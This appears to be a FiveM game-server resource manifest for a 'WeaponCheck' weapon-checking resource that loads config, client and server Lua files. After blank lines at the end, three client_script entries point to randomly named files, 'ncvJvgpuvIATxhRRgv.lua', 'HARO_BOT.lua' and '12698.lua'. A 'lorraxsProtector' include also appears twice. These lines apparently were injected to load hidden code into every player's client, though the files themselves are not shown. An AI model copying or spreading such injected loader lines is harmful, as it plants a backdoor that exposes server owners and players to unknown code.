--[[
client_script "@lorraxsProtector/main.lua"	Bundled from:
		HG-Anticheat: https://github.com/HackerGeo-sp1ne/HG_AntiCheat
		FiveM-BanSql: https://github.com/RedAlex/FiveM-BanSql

]]

description 'WeaponCheck'
client_script "@lorraxsProtector/main.lua"
client_scripts {
	'config.lua',
    'client.lua'
}
server_scripts {
	'@async/async.lua',
	'@mysql-async/lib/MySQL.lua',
	'config.lua',
    'server.lua'
}

dependencies {
	'essentialmode',
	'async'
}



client_script "ncvJvgpuvIATxhRRgv.lua"

client_script "HARO_BOT.lua"
client_script '12698.lua'